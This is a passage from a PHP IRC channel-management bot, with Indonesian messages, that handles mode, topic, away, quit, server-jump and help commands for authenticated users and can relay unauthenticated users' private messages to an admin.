                 fputs($fp, 'MODE '.$chan.' -o+v-oo '.$opnick.' '.$opnick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':!v' && $chan) {
                 if ($com[4]) { $vonick = $com[4]; }
                 else { $vonick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' +vvv '.$vonick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':!dv' && $chan) {
                 if ($com[4]) { $vonick = $com[4]; }
                 else { $vonick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' -vvv '.$vonick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':!away' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = strstr($data,":`awaymsg");
                 $msg = str_replace(":`awaymsg","",$msg);
                 if (strlen($msg)<3) {
                   $raway="on";
                   fputs($fp,'AWAY : ' . 'AWAY' . CRL);
                 }
                 else {
                   $raway="off";
                   fputs($fp,'AWAY : ' . $msg . CRL);
                 }
               }
               elseif ($com[3]==':!mode' && $com[4] && $chan) {
                 fputs($fp, 'MODE '.$chan.' :'.$com[4].' '.$com[5] . CRL);
               }
               elseif ($com[3]==':!nickmode' && $com[4]) {
                 $nickmode = $com[4];
                 fputs($fp, 'MODE '.$nick.' :'.$nickmode . CRL);
               }
               elseif ($com[3]==':!chanlist') {
                 fputs($fp, 'NOTICE '.$dNick.' :Channel List: '.$channels . CRL);
               }
               elseif ($com[3]==':!userlist') {
                 $userlist="";
                 foreach ($auth as $user) {
                   if ($user["pass"]) { $pass="-pass ok"; }
                   else { $pass="-no pass"; }
                   $userlist .= $user["name"].'('.$user["status"].$pass.') ';
                 }
                 fputs($fp, 'NOTICE '.$dNick.' :User List: '.$userlist . CRL);
               }
               elseif ($com[3]==':!quit' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = strstr($data,":!quit");
                 $msg = str_replace(":!quit","",$msg);
                 if (strlen($msg)>3) {
                   $msg = str_replace(" ","_",$msg);
                 }
                 $quitmsg = $quitmsglist[rand(0,count($quitmsglist) - 1)];
                 fputs($fp, 'QUIT ' . $quitmsg . CRL);
                 $keluar = 1;
                 exit;
               }
               elseif ($com[3]==':!vhost' && $auth["$dNick"]["status"]=="Admin") {
                 if ($com[4]) { $localhost = $com[4]; }
                 else { $localhost = 'localhost'; }
                 $keluar = 0;
                 fputs($fp, 'QUIT ' . CRL);
               }
               elseif ($com[3]==':!jump' && $auth["$dNick"]["status"]=="Admin") {
                 if (empty($com[4])) {
                   $remotehost = $remotehost2[rand(0,count($remotehost2) - 1)];
                 }
                 else { $remotehost = $com[4]; }
                 $keluar = 0;
                 fputs($fp, "QUIT Ganti Server".CRL);
               }
               elseif ($com[3]==':!ident' && $auth["$dNick"]["status"]=="Admin") {
                 if (!$com[4]) { $username = $username; }
                 else { $username = $com[4]; }
                 $keluar = 0;
                 fputs($fp, 'QUIT Ganti Ident ' . CRL);
               }
               elseif ($com[3]==':!fullname' && $auth["$dNick"]["status"]=="Admin") {
                 if (!$com[4]) { $realname = "--"; }
                 else { $realname = $com[4]; }
                 $keluar = 0;
                 fputs($fp, 'QUIT Ganti Nama ' . CRL);
               }
               elseif ($com[3]==':!topic' && $com[4] && $chan) {
                 $msg = strstr($data,":!topic");
                 $msg = str_replace(":!topic ","",$msg);
                 fputs($fp, 'TOPIC '.$chan.' :'.$msg . CRL);
               }
               elseif ($com[3]==':!help' && !$chan) {
                 fputs($fp,'PING 12886241614'. CRLF);
                 $msgdelay = 0;
                 foreach ($helptext as $baris){
                   $msgdelay++;
                   if($msgdelay >= 2) { sleep(2) ; $msgdelay = 0; }
                   fputs($fp,'PRIVMSG '.$dNick.' :'.$baris. CRL);
                 }
                 unset($baris);
                 unset($msgdelay);
               }
               /*** AUTO RESPONSE COMMAND BY ipays **/
               elseif ($com[3]==':!ngomong') {
                 $ngomong = TRUE;
                 $autowelcome = TRUE;
                 if ($chan) {fputs($fp,'PRIVMSG '.$chan.' :ACTION seneng boleh ngomong lagi!'. CRL); }
                 else { fputs($fp,'NOTICE '.$dNick.' :Ok boss, gue ngomong deh. ' . CRL); }
               }
               elseif ($com[3]==':!diam') {
                 $ngomong = FALSE;
                 $autowelcome = FALSE;
                 if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :ACTION ga boleh ngomong neh :('. CRL); }
                 else { fputs($fp,'NOTICE '.$dNick.' :Ok boss, gue diem deh. ' . CRL); }
               }
             }
             else { fputs($fp,'NOTICE '.$dNick.' :Mohon auth dulu! Ketik: auth <password> '. CRL); }
           }
         }
         elseif (!$auth["$dNick"] && !eregi("auth",$iText)) {
           if (eregi("www.",$iText) || eregi("http:",$iText) || eregi("join #",$iText)) {
             if (!ereg("#",$dCommand)) {
               if ($log=="on") {
                 fputs($fp,'PRIVMSG '. $admin .' :4inviter: ' . $dFrom . '2:' .$iText. CRL);
               }
               $inv = strstr($dFrom,'@');
               foreach ($auth as $user) {
                 if ($user["status"]=="user") {
                   fputs($fp, 'NOTICE '.$user["name"].' :KB '.$chan.' '.$dNick.' '.$inv.'' . CRL);
                 }
               }
             }
           }
           elseif (!ereg("#",$dCommand) && $log=="on") {
             fputs($fp,'PRIVMSG '.$admin.' :6' . $dFrom . '12:' .$iText. CRL);
           }
         }
       }
     }
     elseif (substr($data,0,4) == 'PING') {
       fputs($fp,'PONG ' . substr($data,5) . CRL);
     }
   }
 }
 fclose($fp);
} while ($keluar == 0);
}

rx($nick);

?>
